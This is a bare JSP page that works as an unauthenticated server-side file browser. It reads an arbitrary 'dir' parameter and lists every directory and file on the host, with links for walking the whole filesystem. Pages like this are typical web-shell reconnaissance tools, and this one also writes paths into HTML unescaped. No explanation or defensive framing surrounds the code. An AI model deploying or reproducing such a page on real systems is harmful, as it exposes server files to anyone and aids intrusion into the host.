<%@ page language="java" %>
<%@ page import="java.io.File" %>
<%@ page import="java.util.*" %>
<html><body><pre><%

String dir = request.getParameter("dir");
if (dir == null || dir.length() == 0) {
	ServletContext context = session.getServletContext();
	dir = context.getRealPath("/");
}

File file = new File(dir);

if (!file.exists() && !file.isDirectory()) {
	out.println("Not valid path");

} else {

	out.println("[" + file.getCanonicalPath() + "]\n");

	// Output parent, if one exists.
	File parent = file.getParentFile();
	if (parent != null && parent.exists()) {
		out.print("<a href=\"?dir=" + parent.getCanonicalPath() + "\">");
		out.print("../");
		out.println("</a>");
	}

	// Output child directories.
	for (File child : file.listFiles()) {
		if (child.isDirectory()) {
			out.print("<a href=\"?dir=" + child.getCanonicalPath() + "\">");
			out.print(child.getName() + "/");
			out.println("</a>");
		}
	}

	// Output child files.
	for (File child : file.listFiles()) {
		if (!child.isDirectory()) {
			out.println(child.getName());
		}
	}
}

%></pre></body></html>